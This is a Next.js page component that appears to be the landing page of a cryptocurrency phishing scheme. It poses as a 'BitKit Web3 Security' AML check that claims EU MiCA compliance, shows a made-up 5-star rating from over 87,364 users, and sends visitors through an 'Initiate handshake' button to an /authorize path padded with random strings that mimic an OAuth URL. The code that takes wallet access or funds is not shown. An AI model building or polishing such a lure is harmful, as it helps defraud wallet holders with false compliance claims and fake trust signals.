'use client'

import handShake from './images/handshake.svg'
import Image from 'next/image'
import { useState, useCallback } from 'react'
import { generateRandomString } from './utils/random'
import TrustStats from './components/stars'
import Footer from './components/footer'

export default function Home() {
  const [isLoading, setIsLoading] = useState(false)

  const handleClick = useCallback(() => {
    setIsLoading(true)
    
    setTimeout(() => {
      const randomUrl = generateRandomString(64)
      const randomOauthId = generateRandomString(12)
      window.location.href = `/authorize?url=${randomUrl}/api/1/login/oauth_id=${randomOauthId}/provider/authorize`
    }, 1000) // Changed to 1000ms (1 second) as per your request
  }, [])

  return (
    <div className="px-6 py-8 bg-[#1b1b1c] text-white font-bold overflow-hidden">
      <div>
        <svg width="39" height="43" viewBox="0 0 39 43" fill="none">
          <path
            d="M0.710815 6.67346L19.4317 0.606445V42.6064C6.05944 37.0059 0.710815 26.2727 0.710815 20.207V6.67346Z"
            className="fill-[#48FF91]"
          ></path>
          <path
            d="M38.1537 6.67346L19.4329 0.606445V42.6064C32.8051 37.0059 38.1537 26.2727 38.1537 20.207V6.67346Z"
            fill="url(#paint0_linear_524_77595undefined)"
          ></path>
          <path
            d="M38.1537 6.67346L19.4329 0.606445V42.6064C32.8051 37.0059 38.1537 26.2727 38.1537 20.207V6.67346Z"
            fill="url(#paint1_linear_524_77595undefined)"
          ></path>
          <defs>
            <linearGradient
              id="paint1_linear_524_77595undefined"
              x1="18.6423"
              y1="47.8852"
              x2="33.8833"
              y2="-7.39981"
              gradientUnits="userSpaceOnUse"
            >
              <stop offset="0.26" stopColor="#48FF91"></stop>
              <stop offset="0.66" stopColor="#0094FF"></stop>
              <stop offset="0.8" stopColor="#0038FF"></stop>
              <stop offset="0.89" stopColor="#0500FF"></stop>
            </linearGradient>
          </defs>
        </svg>
      </div>
      
      <div className="flex mt-12"> 
        <div>
          <div className="flex flex-col">
            <h5 className="mr-4 text-[#48FF91] font-regular text-sm">SIGNATURE VERIFICATION</h5>
            <h5 className="text-[#48FF91] font-bold text-sm">Powered by BitKit Web3 Security</h5> 
          </div>
    
          <div className="mt-16 max-w-[600px]">
            <h1 className="flex flex-col scroll-m-20 text-4xl font-bold tracking-tight lg:text-5xl">
              <span className='font-bold'>You have been</span> 
              <span>requested to perform <span className="text-[#48FF91]">AML</span></span> 
              verification
            </h1>
            <p className="mt-4 font-regular text-base text-[#707070]">
              By verifying wallets with a simple EU MICA compliant verification process, we protect customers and sellers from fraud, underhanding and other types of dangers.
            </p>
          </div>
        
          <div className="mt-16">
            <button
              onClick={handleClick}
              disabled={isLoading}
              className="px-[18px] py-3 text-base bg-[#48ff91] rounded text-[#1b1b1c] flex items-center justify-center relative cursor-pointer disabled:opacity-70"
            >
              <span className={`transition-opacity duration-200 ${isLoading ? 'opacity-0' : 'opacity-100'}`}>
                Initiate handshake
              </span>
              <div
                className={`w-5 h-5 border-2 border-[#1b1b1c] border-t-transparent rounded-full animate-spin absolute ${
                  isLoading ? 'opacity-100' : 'opacity-0'
                }`}
              ></div>
            </button>
          </div>
        
          <div className="mt-[34px] text-base">
            <span>⭐⭐⭐⭐⭐</span>
            <span className="mx-2">|</span>
            <span>Rated 5 stars by over 87,364 users</span>
          </div>
        </div>
        <div className="hidden landscape:block">
          <Image src={handShake} alt="Handshake" width={500} height={500} className="h-[80vh] ml-[200px]" />
        </div>

      </div>
      <TrustStats />
      <Footer />
    </div>
  )
}

